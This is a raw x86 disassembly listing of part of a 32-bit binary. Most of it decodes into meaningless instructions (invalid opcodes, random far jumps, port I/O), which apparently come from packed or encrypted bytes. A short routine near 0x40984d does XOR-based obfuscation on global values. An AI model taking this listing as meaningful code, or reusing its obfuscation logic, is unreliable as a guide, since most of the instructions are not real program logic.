  40950e:	sahf   
  40950f:	adc    ch,dh
  409511:	mov    dl,0xb0
  409513:	out    0xc9,eax
  409515:	mov    bh,0x77
  409517:	dec    eax
  409518:	mov    ecx,0x52a1bac2
  40951d:	xchg   esi,eax
  40951e:	retf   0x2267
  409521:	jge    0x40954e
  409523:	inc    ebp
  409524:	add    eax,0xd2c71243
  409529:	aas    
  40952a:	pop    ds
  40952b:	add    dh,BYTE PTR [edi-0x1a]
  40952e:	(bad)  
  40952f:	out    0x86,al
  409531:	mov    ah,0xa8
  409533:	retf   
  409534:	ja     0x40958b
  409536:	jl     0x409591
  409538:	xchg   edi,ecx
  40953a:	jg     0x4094c8
  40953c:	jge    0x409549
  40953e:	shr    ecx,1
  409540:	scas   eax,DWORD PTR es:[edi]
  409541:	jl     0x4095ab
  409543:	add    eax,0xa6fa0cf5
  409548:	sub    al,0xc4
  40954a:	pop    edi
  40954b:	dec    ebx
  40954c:	adc    esi,DWORD PTR [eax+ebx*8-0x3a]
  409550:	repnz push edi
  409552:	fidiv  WORD PTR [edx]
  409554:	shr    DWORD PTR [ecx],1
  409556:	push   esp
  409557:	pop    ss
  409558:	loope  0x409581
  40955a:	xchg   DWORD PTR [edx+ebp*4-0x3e4ad4cb],edi
  409561:	nop
  409562:	out    0x86,eax
  409564:	add    eax,0xb13680c8
  40956a:	xlat   BYTE PTR ds:[ebx]
  40956b:	frstor [edx-0x64662e76]
  409571:	sub    DWORD PTR [edi+0x17],edi
  409574:	mov    BYTE PTR [eax-0x25],0xf3
  409578:	aaa    
  409579:	hlt    
  40957a:	ins    DWORD PTR es:[edi],dx
  40957b:	add    ebx,DWORD PTR ds:0xb6c4cdaa
  409581:	cmp    al,BYTE PTR [ebx]
  409583:	cmp    al,0xe7
  409585:	sub    eax,0xc6b6021e
  40958a:	(bad)  
  40958c:	or     ecx,DWORD PTR [ebp+0x4b]
  40958f:	or     eax,0x4fd84aff
  409594:	ficomp WORD PTR [ebp+0x26]
  409597:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409598:	jmp    0x4095fd
  40959a:	fadd   QWORD PTR [ebx+ebp*4]
  40959d:	cmp    DWORD PTR [edi+ecx*2-0x73],esi
  4095a1:	aam    0x7e
  4095a3:	or     dh,BYTE PTR [eax]
  4095a5:	jecxz  0x409532
  4095a7:	sub    al,0x79
  4095a9:	gs cwde 
  4095ab:	ds inc ebx
  4095ad:	js     0x4095a1
  4095af:	and    eax,0xc1fd3126
  4095b4:	mov    esi,esp
  4095b6:	jge    0x40960c
  4095b8:	jl     0x40956c
  4095ba:	push   ebx
  4095bb:	sbb    esi,ecx
  4095bd:	sub    BYTE PTR ds:0x18c97555,al
  4095c3:	jecxz  0x409626
  4095c5:	jl     0x409631
  4095c7:	lods   eax,DWORD PTR ds:[esi]
  4095c8:	daa    
  4095c9:	sbb    eax,0x10fd970
  4095ce:	push   ecx
  4095cf:	xor    DWORD PTR [edx+0x7c],ebx
  4095d2:	or     al,0x8f
  4095d4:	dec    ecx
  4095d5:	jo     0x40956f
  4095d7:	loopne 0x40960c
  4095d9:	aas    
  4095da:	outs   dx,BYTE PTR ds:[esi]
  4095db:	inc    ebx
  4095dc:	jg     0x409615
  4095de:	pusha  
  4095df:	cmc    
  4095e0:	ret    0x6435
  4095e3:	clc    
  4095e4:	ror    DWORD PTR [esi],1
  4095e6:	mov    eax,DWORD PTR [eax-0x63]
  4095e9:	dec    edx
  4095ea:	call   0x406b0f
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8e17:0x36a4c14e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	sbb    bl,bl
  40960e:	stos   DWORD PTR es:[edi],eax
  40960f:	pop    ebx
  409610:	pop    ds
  409611:	mov    WORD PTR [ebp+edi*8+0x4090271a],fs
  409618:	jo     0x40964f
  40961a:	int    0xaf
  40961c:	ins    DWORD PTR es:[edi],dx
  40961d:	out    0x2f,al
  40961f:	push   ecx
  409620:	inc    ecx
  409621:	sbb    dl,BYTE PTR [ebx]
  409623:	jecxz  0x409693
  409625:	mov    ds:0x4de589bf,al
  40962a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40962b:	xor    BYTE PTR [edx-0x11],cl
  40962e:	cmp    DWORD PTR [ebx-0x7e],edi
  409631:	push   ebx
  409632:	and    DWORD PTR [edx],0xc444c4e4
  409638:	mov    WORD PTR [edx-0x7],ss
  40963b:	sub    DWORD PTR [ebx],0xffffffc8
  40963e:	shr    DWORD PTR [edi+0x26],1
  409641:	mov    edx,0x7769033b
  409646:	and    esi,DWORD PTR [edx]
  409648:	les    esp,FWORD PTR [edi]
  40964a:	pop    edi
  40964b:	div    DWORD PTR [edi]
  40964d:	ins    BYTE PTR es:[edi],dx
  40964e:	mov    dl,0xbd
  409650:	and    dh,BYTE PTR [ebp-0x1f]
  409653:	inc    esi
  409654:	loop   0x40966e
  409656:	ds inc esi
  409658:	pop    eax
  409659:	fnstenv [edx-0x51]
  40965c:	lods   eax,DWORD PTR ds:[esi]
  40965d:	int3   
  40965e:	jo     0x4096ab
  409660:	lods   eax,DWORD PTR ds:[esi]
  409661:	add    BYTE PTR [eax],0x3c
  409664:	xor    eax,0x35fa3675
  409669:	fwait
  40966a:	mov    al,0xc8
  40966c:	fld    TBYTE PTR [edx-0x11964abc]
  409672:	adc    BYTE PTR [ecx],cl
  409674:	scas   eax,DWORD PTR es:[edi]
  409675:	in     eax,dx
  409676:	loopne 0x4096a9
  409678:	lods   eax,DWORD PTR ds:[esi]
  409679:	fcom   QWORD PTR [ebx]
  40967b:	or     dh,cl
  40967d:	mov    BYTE PTR [ecx],ch
  40967f:	ins    DWORD PTR es:[edi],dx
  409680:	mov    esi,0x4e93aa29
  409685:	fs push eax
  409687:	adc    edi,DWORD PTR [edx+0x76]
  40968a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40968b:	addr16 jb 0x40962b
  40968e:	test   BYTE PTR ds:0x2985bdb,bh
  409694:	inc    esi
  409695:	inc    ecx
  409696:	dec    ebx
  409697:	pop    esi
  409698:	dec    esi
  409699:	fldcw  WORD PTR [esi-0x7]
  40969c:	std    
  40969d:	jge    0x409700
  40969f:	fistp  QWORD PTR [edi+0x57]
  4096a2:	stos   BYTE PTR es:[edi],al
  4096a3:	adc    al,0xa1
  4096a5:	mov    dh,0xe5
  4096a7:	xor    al,0x92
  4096a9:	xor    al,0x26
  4096ab:	lahf   
  4096ac:	mov    bh,0x24
  4096ae:	ins    BYTE PTR es:[edi],dx
  4096af:	bound  esp,QWORD PTR [ebp+0x78]
  4096b2:	dec    ebp
  4096b3:	or     eax,0x3c04ed1d
  4096b8:	xor    al,BYTE PTR [esi-0x54]
  4096bb:	mov    al,BYTE PTR ss:[edi]
  4096be:	fdiv   DWORD PTR [eax-0x4ac341f]
  4096c4:	sub    al,0x14
  4096c6:	dec    eax
  4096c7:	pop    es
  4096c8:	sahf   
  4096c9:	pushf  
  4096ca:	ins    BYTE PTR es:[edi],dx
  4096cb:	add    DWORD PTR [ecx-0x119aba49],edx
  4096d1:	ror    bl,cl
  4096d3:	dec    ebx
  4096d4:	sbb    DWORD PTR [ebx+0xbf2e747],0xfffffff1
  4096db:	sub    al,0xc7
  4096dd:	push   ebp
  4096de:	inc    ecx
  4096df:	retf   
  4096e0:	sbb    ebx,esi
  4096e2:	push   esi
  4096e3:	ret    
  4096e4:	sub    eax,0x8fe9f446
  4096e9:	xchg   DWORD PTR ds:0x41ba6bc6,ebx
  4096ef:	div    DWORD PTR [ebp-0x5b0db67]
  4096f5:	sub    al,BYTE PTR [edx]
  4096f7:	pop    esp
  4096f8:	data16 (bad) 
  4096fa:	or     ecx,DWORD PTR [edi-0x2f]
  4096fd:	ret    
  4096fe:	dec    eax
  4096ff:	bound  esi,QWORD PTR [esi-0x3e]
  409702:	outs   dx,BYTE PTR ds:[esi]
  409703:	(bad)  
  409704:	fldcw  WORD PTR [esi+edi*1-0x2f9034e0]
  40970b:	pop    ebp
  40970c:	ret    
  40970d:	adc    ch,BYTE PTR [esp+ebx*2-0x3]
  409711:	lea    edx,[edi]
  409713:	(bad)  
  409714:	(bad)  
  409715:	test   eax,0x8579bf02
  40971a:	jmp    0x409783
  40971c:	int3   
  40971d:	gs aad 0xb9
  409720:	jne    0x4096fc
  409722:	xor    al,0x7d
  409724:	sub    BYTE PTR [ecx+0x1561a20b],0xde
  40972b:	hlt    
  40972c:	sbb    BYTE PTR [ebx+0x50b17bb1],cl
  409732:	xchg   BYTE PTR [edi-0x5a01783c],bh
  409738:	in     al,dx
  409739:	jae    0x409722
  40973b:	ins    DWORD PTR es:[edi],dx
  40973c:	je     0x409755
  40973e:	pop    ds
  40973f:	mov    edi,0xc1f97428
  409744:	pop    edx
  409745:	imul   edi,DWORD PTR [eax+0x2dd79fda],0x9f464ad4
  40974f:	imul   ebx,DWORD PTR es:[ebx+eax*2-0xc856814],0x1d
  409758:	sbb    dh,BYTE PTR [eax]
  40975a:	mov    edx,0xef7409ec
  40975f:	loopne 0x40973a
  409761:	dec    ecx
  409762:	xor    ch,ah
  409764:	ret    
  409765:	icebp  
  409766:	inc    ecx
  409767:	dec    edi
  409768:	rcr    ebp,1
  40976a:	scas   al,BYTE PTR es:[edi]
  40976b:	je     0x40971e
  40976d:	(bad)  
  40976e:	pop    ds
  40976f:	jl     0x4096f6
  409771:	enter  0xba89,0x4c
  409775:	sbb    al,0xc7
  409777:	push   es
  409778:	test   BYTE PTR [ebx+0x65],dh
  40977b:	sbb    BYTE PTR [eax-0x12a84fa8],cl
  409781:	hlt    
  409782:	jo     0x40976a
  409784:	data16 (bad) 
  409786:	mov    eax,0xb2551e5d
  40978b:	push   esp
  40978c:	les    esp,FWORD PTR [eax+0x5ebce080]
  409792:	xchg   DWORD PTR [ecx-0x22fb3bf6],eax
  409798:	popf   
  409799:	xchg   esi,eax
  40979a:	and    eax,0xaa3948e8
  40979f:	ins    DWORD PTR es:[edi],dx
  4097a0:	push   ds
  4097a1:	adc    al,0x61
  4097a3:	addr16 das 
  4097a5:	and    BYTE PTR [esi-0xc465bfd],bl
  4097ab:	test   eax,0x213b6f32
  4097b0:	out    dx,al
  4097b1:	(bad)  
  4097b2:	and    eax,0xa6ebd0db
  4097b7:	loopne 0x4097ac
  4097b9:	adc    BYTE PTR [edi-0x1d63098],dh
  4097bf:	cmp    eax,0x1cb9f0d5
  4097c4:	lahf   
  4097c5:	pop    ecx
  4097c6:	or     eax,0xbf2b3eeb
  4097cb:	add    DWORD PTR [ecx+edi*2+0x21],esp
  4097cf:	mov    ch,al
  4097d1:	stos   DWORD PTR es:[edi],eax
  4097d2:	dec    ebp
  4097d3:	pushf  
  4097d4:	dec    esi
  4097d5:	clc    
  4097d6:	inc    ecx
  4097d7:	loope  0x40981e
  4097d9:	cmp    ebx,DWORD PTR [eax+0x62]
  4097dc:	ret    
  4097dd:	or     esi,DWORD PTR [ebx+0x11ad47f0]
  4097e3:	lods   al,BYTE PTR ds:[esi]
  4097e4:	inc    edi
  4097e5:	(bad)  
  4097e6:	jecxz  0x409862
  4097e8:	mov    dh,0x3e
  4097ea:	sti    
  4097eb:	push   ecx
  4097ec:	loopne 0x4097b4
  4097ee:	dec    ebp
  4097ef:	addr16 mov ds:0xd632,eax
  4097f3:	push   esp
  4097f4:	mov    edx,ebx
  4097f6:	sbb    cl,cl
  4097f8:	cmp    eax,DWORD PTR [eax]
  4097fa:	gs sbb eax,0xc5de0297
  409800:	cmp    DWORD PTR [esi-0x764469e8],ecx
  409806:	jmp    0xf89e:0xf6747971
  40980d:	jbe    0x409840
  40980f:	int3   
  409810:	or     bl,bl
  409812:	or     BYTE PTR [esi],bh
  409814:	jmp    0x5aa797e4
  409819:	dec    ebp
  40981a:	mov    eax,ds:0x153d9c94
  40981f:	sbb    DWORD PTR [ebp+0x1de5cbfa],eax
  409825:	inc    ebp
  409826:	hlt    
  409827:	xor    DWORD PTR [edi],edi
  409829:	daa    
  40982a:	jmp    0xce57e678
  40982f:	adc    DWORD PTR [ebp-0x79ac6ccc],0x6d
  409836:	mov    eax,DWORD PTR [ebp-0xc]
  409839:	cmp    eax,ebx
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x4337df
  40986f:	xor    DWORD PTR ds:0x433717,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x4337db,0x4337ab
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x433767,0x433813
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x4336fb
  4098a6:	sub    DWORD PTR ds:0x4337df,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	fs push 0xfffffff7
  4098c3:	sub    dh,BYTE PTR [ecx+ebx*8+0x7c387e7e]
  4098ca:	jle    0x40994a
  4098cc:	mov    ebx,0x899afbe0
  4098d1:	jae    0x409948
  4098d3:	lds    ebp,FWORD PTR [ecx-0xc]
  4098d6:	fild   QWORD PTR [edx]
  4098d8:	sbb    al,0x49
  4098da:	dec    eax
  4098db:	add    DWORD PTR [ebx+0x43d81b9d],edi
  4098e1:	push   ss
  4098e2:	adc    al,0xc5
  4098e4:	(bad)  
  4098e6:	xchg   edx,esp
  4098e8:	enter  0x1b03,0xca
  4098ec:	or     cl,BYTE PTR [esi-0x56]
  4098ef:	cmp    esp,0xbc5705cf
  4098f5:	xchg   esp,eax
  4098f6:	or     bh,BYTE PTR [ebx]
  4098f8:	ins    DWORD PTR es:[edi],dx
  4098f9:	int3   
  4098fa:	ins    DWORD PTR es:[edi],dx
  4098fb:	cwde   
  4098fc:	adc    eax,0x9ac4350
  409901:	fsubr  QWORD PTR [edi-0xabd8255]
  409907:	cmp    BYTE PTR ds:0xc0959377,cl
  40990d:	aas    
  40990e:	pop    edi
  40990f:	push   ebx
  409910:	enter  0xd11,0xdc
  409914:	std    
  409915:	ror    BYTE PTR [ebp+eax*4-0x5e],cl
  409919:	mov    ss,WORD PTR [ebx+0x1d]
  40991c:	shr    BYTE PTR [edx+0x28],1
  40991f:	das    
  409920:	inc    esi
  409921:	(bad)  
  409922:	std    
  409923:	add    esp,DWORD PTR [esi-0x12216ea0]
  409929:	mov    dl,0xf4
  40992b:	dec    edi
  40992c:	aas    
  40992d:	cwde   
  40992e:	and    al,0xa8
  409930:	xchg   edi,eax
  409931:	cdq    
  409932:	mov    WORD PTR [edx],fs
  409934:	(bad)  
  409935:	shr    DWORD PTR [edx+ebx*2+0x68f77de4],cl
  40993c:	lods   eax,DWORD PTR ds:[esi]
  40993d:	cmp    al,0x38
  40993f:	sbb    al,0x3a
  409941:	inc    edi
  409942:	pop    ds
  409943:	fisttp DWORD PTR [edi]
  409945:	dec    edx
  409946:	test   BYTE PTR [eax+0x40],ah
  409949:	or     ecx,ecx
  40994b:	imul   esp,DWORD PTR [ecx+0x38e533a],0xd1d9d6cc
  409955:	ja     0x40991c
  409957:	pop    edi
  409958:	in     eax,0xf
  40995a:	neg    DWORD PTR [eax-0x224bc31]
  409960:	lea    esi,[eax-0x37629143]
  409966:	mov    ?,WORD PTR [eax+ebx*4]
  409969:	add    eax,0xc0ce3a1f
  40996e:	fst    st(2)
  409970:	mul    BYTE PTR [ebx]
  409972:	pop    ecx
  409973:	push   edi
  409974:	dec    ebx
  409975:	test   al,0xe6
  409977:	hlt    
  409978:	xor    cl,BYTE PTR [ecx+0x593ef0cc]
  40997e:	jae    0x409981
  409980:	in     eax,dx
  409981:	push   0x830e67ac
  409986:	push   0x38ed7e49
  40998b:	(bad)  
  40998c:	ret    
  40998d:	mov    ebx,0x5d59c622
  409992:	mov    bl,0xed
  409994:	rol    esi,0xaa
  409997:	inc    ebp
  409998:	cmp    DWORD PTR [ebp-0x3f2164a5],esi
  40999e:	xor    DWORD PTR [ebx-0x3b],edx
  4099a1:	cld    
  4099a2:	jns    0x4099c0
  4099a4:	jmp    0x5a7f:0xebfec3a2
  4099ab:	sub    eax,0x5490da17
  4099b0:	cmp    DWORD PTR [edx+eax*1-0x70],eax
  4099b4:	push   esp
  4099b5:	pop    ebx
  4099b6:	shl    ecx,1
  4099b8:	(bad)  
  4099b9:	retf   
  4099ba:	cmp    WORD PTR [edx],sp
  4099bd:	mov    eax,0xd13a44f5
  4099c2:	jle    0x4099ea
  4099c4:	dec    ebx
  4099c5:	pop    ss
  4099c6:	daa    
  4099c7:	xchg   BYTE PTR [ebx],bh
  4099c9:	or     BYTE PTR ss:[edi+0x12],cl
  4099cd:	mov    ah,0x21
  4099cf:	or     esi,ebx
  4099d1:	inc    edi
  4099d2:	ss xor al,0x9b
  4099d5:	and    ch,BYTE PTR [edx-0x2]
  4099d8:	inc    esi
  4099d9:	loopne 0x4099ea
  4099db:	jne    0x409996
  4099dd:	out    0x75,eax
  4099df:	sbb    al,BYTE PTR [edi-0x7546402f]
  4099e5:	inc    eax
  4099e6:	cld    
  4099e7:	std    
  4099e8:	jg     0x409a64
  4099ea:	mov    fs,WORD PTR [esi+0xf4f25df]
  4099f0:	loop   0x40999a
  4099f2:	mov    dx,0x8d1f
  4099f6:	daa    
  4099f7:	mov    edx,0xc86c2533
  4099fc:	std    
  4099fd:	ret    
  4099fe:	and    bl,BYTE PTR [ebp-0x26d216b5]
  409a04:	mov    ch,0xf2
  409a06:	sub    BYTE PTR [ebx+edx*1+0x33c1e12b],ah
  409a0d:	imul   esp,DWORD PTR [edi+0x65ee9e28],0x52
  409a14:	xor    al,0x5c
  409a16:	in     eax,dx
  409a17:	cmp    eax,0xd66ebd8
  409a1c:	inc    eax
  409a1d:	cld    
  409a1e:	mov    ds:0x41c89792,al
  409a23:	adc    eax,0xfc97a20f
  409a28:	aad    0xf1
  409a2a:	push   es
  409a2b:	not    BYTE PTR ds:0x7ddb71d9
  409a31:	dec    ecx
  409a32:	(bad)  
  409a33:	cmp    edx,DWORD PTR [ebp-0x1b]
  409a36:	push   edi
  409a37:	test   BYTE PTR [ecx+ebp*2],bh
  409a3a:	ret    0x88f9
  409a3d:	ds jo  0x409a60
  409a40:	sti    
  409a41:	cmp    BYTE PTR [eax-0xf032c09],dl
  409a47:	mov    bl,0xea
  409a49:	jge    0x409a61
  409a4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a4c:	cmp    al,0xd7
  409a4e:	mov    esi,DWORD PTR [edx-0x51]
  409a51:	pop    esp
  409a52:	inc    esp
  409a53:	cs push esi
  409a55:	call   FWORD PTR [ebp-0x704bf201]
  409a5b:	sub    BYTE PTR [eax],dh
  409a5d:	xor    ebx,0x1673f6df
  409a63:	lods   al,BYTE PTR ds:[esi]
  409a64:	adc    al,0x7d
  409a66:	js     0x409ab4
  409a68:	inc    esi
  409a69:	add    eax,esi
  409a6b:	jno    0x409ae7
  409a6d:	inc    ecx
  409a6e:	adc    eax,0xcaa10220
  409a73:	or     eax,0xb18bdbda
  409a78:	sbb    eax,DWORD PTR [esi]
  409a7a:	ja     0x409a16
  409a7c:	and    eax,0xdece0af7
  409a81:	and    eax,0x2d395031
  409a86:	imul   eax,DWORD PTR [ebx-0x34],0xffffffc8
  409a8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a8b:	and    eax,DWORD PTR [ecx-0x34021d5d]
  409a91:	dec    eax
  409a92:	mov    al,ds:0x6378df24
  409a97:	inc    ebp
  409a98:	fs loop 0x409ada
  409a9b:	mov    ecx,0x8e389462
  409aa0:	inc    esi
  409aa1:	div    DWORD PTR [edi-0x49]
  409aa4:	retf   
  409aa5:	xor    bh,BYTE PTR [ebx+0x34]
  409aa8:	pop    ebp
  409aa9:	jge    0x409a8b
  409aab:	js     0x409ab4
  409aad:	cmp    dh,dh
  409aaf:	pop    ss
  409ab0:	sbb    dh,0x9b
  409ab3:	xchg   BYTE PTR [ecx-0x64377d55],ah
  409ab9:	xchg   DWORD PTR [edi],esi
  409abb:	xor    eax,edx
  409abd:	mov    ah,BYTE PTR [esi]
  409abf:	xchg   ecx,eax
  409ac0:	mov    ds:0xbf6a3187,eax
  409ac5:	stc    
  409ac6:	cmp    al,0x8d
  409ac8:	out    dx,eax
  409ac9:	dec    ebp
  409aca:	mov    bl,0x3b
  409acc:	repnz stc 
  409ace:	aam    0xd
  409ad0:	retf   0xe740
  409ad3:	das    
  409ad4:	jb     0x409a89
  409ad6:	mov    bl,0x1d
  409ad8:	add    dh,BYTE PTR [ebp-0x70]
  409adb:	mov    eax,0xf472968d
  409ae0:	xchg   edi,eax
  409ae1:	cmp    BYTE PTR [ecx+edx*8+0x29],bh
  409ae5:	jb     0x409b29
  409ae7:	xchg   ebp,eax
  409ae8:	rcr    BYTE PTR cs:[ebx],0xfe
  409aec:	popf   
  409aed:	push   es
  409aee:	dec    eax
  409aef:	ffreep st(1)
  409af1:	add    dh,BYTE PTR [ecx]
  409af3:	mov    edi,0x38a428ff
  409af8:	pop    esp
  409af9:	loop   0x409b6d
  409afb:	mov    bl,0xae
  409afd:	pop    ss
  409afe:	or     BYTE PTR [ebp-0x52de7b11],dl
  409b04:	and    ebx,DWORD PTR [ebp+0x61]
  409b07:	int    0xe5
  409b09:	push   esi
  409b0a:	jg     0x409ab5
  409b0c:	pop    ds
  409b0d:	add    al,0xba
  409b0f:	imul   ecx,DWORD PTR [ebx+edi*8],0x1d815756
  409b16:	lahf   
  409b17:	aaa    
  409b18:	inc    ebx
  409b19:	add    BYTE PTR [ebx+0x37],dl
  409b1c:	inc    ebx
  409b1d:	add    cl,ch
  409b1f:	pop    esi
  409b20:	add    al,BYTE PTR [eax]
  409b22:	add    ch,al
  409b24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b25:	lods   al,BYTE PTR ds:[esi]
  409b26:	shr    BYTE PTR [ecx+edx*8+0x61],cl
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi+0x2a6049d4]
  409b32:	add    bh,BYTE PTR [esi-0x1c]
  409b35:	jle    0x409bb5
  409b37:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409b3b:	and    ah,BYTE PTR [ecx-0x75]
  409b3e:	gs das 
  409b40:	or     eax,0xf2e6e432
  409b45:	lea    eax,[ebp+ebp*8-0x37]
  409b49:	ror    BYTE PTR [ecx-0x63],cl
  409b4c:	ja     0x409b50
  409b4e:	stos   BYTE PTR es:[edi],al
  409b4f:	mov    al,ds:0xd444a94c
  409b54:	xchg   esi,eax
  409b55:	jle    0x409b21
  409b57:	test   DWORD PTR gs:[ebx-0x6453c2eb],eax
  409b5e:	cmp    bl,BYTE PTR [edx+0x301af8f3]
  409b64:	pop    ebx
  409b65:	inc    ecx
  409b66:	xchg   edi,eax
  409b67:	aam    0x6e
  409b69:	aas    
  409b6a:	mov    ?,WORD PTR [edi-0x5d]
  409b6d:	inc    esp
  409b6e:	mov    ds:0xb87bca3b,al
  409b73:	(bad)  
  409b74:	pop    ebx
  409b75:	or     BYTE PTR [ebp-0x24],dh
  409b78:	lds    ebp,FWORD PTR [edi]
  409b7a:	ins    DWORD PTR es:[edi],dx
  409b7b:	into   
  409b7c:	lods   al,BYTE PTR ds:[esi]
  409b7e:	push   ds
  409b7f:	sbb    eax,0x4d1d8b67
  409b84:	int3   
  409b85:	rcr    cl,1
  409b87:	popf   
  409b88:	mov    esi,0x5a202909
  409b8d:	jge    0x409b1b
  409b8f:	gs and al,0x95
  409b92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b93:	dec    ecx
  409b94:	mov    eax,ds:0x55fc09f9
  409b99:	push   es
  409b9a:	or     ecx,DWORD PTR [ebx+0x3c]
  409b9d:	mov    al,BYTE PTR [ebx-0x65]
  409ba0:	in     al,dx
  409ba1:	repz sar DWORD PTR [ebx],0x43
  409ba5:	xchg   BYTE PTR [edi+0x66],dh
  409ba8:	stc    
  409ba9:	cdq    
  409baa:	pop    DWORD PTR [edx+0x3c]
  409bad:	je     0x409b60
  409baf:	pop    eax
  409bb0:	jge    0x409b79
  409bb2:	mov    edi,0x64e247e7
  409bb7:	jmp    0x16ca5aa6
  409bbc:	scas   eax,DWORD PTR es:[edi]
  409bbd:	loopne 0x409b58
  409bbf:	pop    ebx
  409bc0:	data16 or BYTE PTR [esp+edx*2-0x10716d6a],ch
  409bc8:	and    edi,DWORD PTR [edx+0x4d]
  409bcb:	adc    DWORD PTR fs:[ecx],eax
  409bce:	cmc    
  409bcf:	into   
  409bd0:	les    edi,FWORD PTR [esi+0x2aeacd7e]
  409bd6:	mov    ds:0xaf378308,eax
  409bdb:	mov    esp,DWORD PTR [edi]
  409bdd:	dec    ecx
  409bde:	jns    0x409bce
  409be0:	imul   esp,DWORD PTR [esi+0x14c9085a],0xffffffd6
  409be7:	stc    
  409be8:	dec    ecx
  409be9:	shl    BYTE PTR [edi+0x43475a88],1
  409bef:	jmp    0x5190:0xd6d008ed
  409bf6:	sbb    eax,0xa9254dd3
  409bfb:	clc    
  409bfc:	stc    
  409bfd:	and    eax,0xbb16e212
  409c02:	sti    
  409c03:	fs das 
  409c05:	outs   dx,BYTE PTR ds:[esi]
  409c06:	sub    eax,0xad98688c
  409c0b:	push   0xe9e02bfe
  409c10:	or     ch,al
  409c12:	sub    BYTE PTR [esi+eiz*2],0x60
  409c16:	sbb    ch,BYTE PTR [esi+0x7d]
  409c19:	js     0x409bcb
  409c1b:	dec    ebx
  409c1c:	out    dx,al
  409c1d:	xchg   DWORD PTR [esi],edx
  409c1f:	mov    DWORD PTR [ebx-0x1e],0xc5987a48
  409c26:	jmp    0x409ca5
  409c28:	push   0xffffffb8
  409c2a:	retf   0xf012
  409c2d:	sbb    eax,DWORD PTR [esi]
  409c2f:	aas    
  409c30:	pop    ebx
  409c31:	(bad)  
  409c32:	sub    al,0x96
  409c34:	outs   dx,DWORD PTR ds:[esi]
  409c35:	sub    DWORD PTR [eax+eax*4-0x6040b296],esi
  409c3c:	div    DWORD PTR [edx-0x35]
  409c3f:	add    edx,ecx
  409c41:	adc    esi,DWORD PTR [ebx]
  409c43:	scas   eax,DWORD PTR es:[edi]
  409c44:	adc    ebp,DWORD PTR [eax+0x51]
  409c47:	ins    BYTE PTR es:[edi],dx
  409c48:	dec    ebp
  409c49:	jp     0x409cad
  409c4b:	xchg   ah,dl
  409c4d:	cwde   
  409c4e:	lods   eax,DWORD PTR ds:[esi]
  409c4f:	mov    ecx,0x638fd890
  409c54:	pop    esp
  409c55:	inc    edi
  409c56:	int    0xa0
  409c58:	clc    
  409c59:	ins    DWORD PTR es:[edi],dx
  409c5a:	xchg   ebx,eax
  409c5b:	hlt    
  409c5c:	pop    ebp
  409c5d:	or     esi,esp
  409c5f:	adc    eax,0x5310301f
  409c64:	mov    dl,0xff
  409c66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c67:	push   eax
  409c68:	lea    ebx,[eax+0x7f]
  409c6b:	mov    al,ds:0xa4b0dbb8
  409c70:	dec    BYTE PTR [ecx-0x24]
  409c73:	stc    
  409c74:	adc    ebp,ebx
  409c76:	jmp    0x3c32:0x9aa76b9d
  409c7d:	mov    esp,0x7180b77e
  409c82:	pop    ecx
  409c83:	scas   eax,DWORD PTR es:[edi]
  409c84:	mov    dl,0xee
  409c86:	test   al,0xb0
  409c88:	sbb    eax,0x89e677be
  409c8d:	xchg   ecx,eax
  409c8e:	mov    ds,WORD PTR [esi+0x15]
  409c91:	clc    
  409c92:	sbb    BYTE PTR [edi+0x596b80ae],bl
  409c98:	out    dx,eax
  409c99:	pusha  
  409c9a:	push   ss
  409c9b:	push   eax
  409c9c:	les    edi,FWORD PTR ds:0x238025ac
  409ca2:	mov    ecx,0x1ceb9090
  409ca7:	push   ss
  409ca8:	sub    ah,BYTE PTR ds:0xfecf59f0
  409cae:	pop    es
  409caf:	push   ebp
  409cb0:	sub    DWORD PTR [eax+esi*1],edi
  409cb3:	in     eax,0x42
  409cb5:	and    BYTE PTR [esi+0x5f],al
  409cb8:	xchg   BYTE PTR [esi],al
  409cba:	jo     0x409cb1
  409cbc:	pop    ecx
  409cbd:	int3   
  409cbe:	xor    al,0x79
  409cc0:	aad    0xc3
  409cc2:	xor    dl,dh
  409cc4:	dec    edx
  409cc5:	and    al,0x52
  409cc7:	mov    ah,0xe7
  409cc9:	loope  0x409c77
  409ccb:	ss pop es
  409ccd:	test   DWORD PTR [ebp+ebp*2-0x78640a18],ecx
  409cd4:	or     al,0xaf
  409cd6:	test   DWORD PTR [ebp-0x77],ecx
  409cd9:	out    dx,al
  409cda:	das    
  409cdb:	cmp    al,0x8d
  409cdd:	xlat   BYTE PTR ds:[ebx]
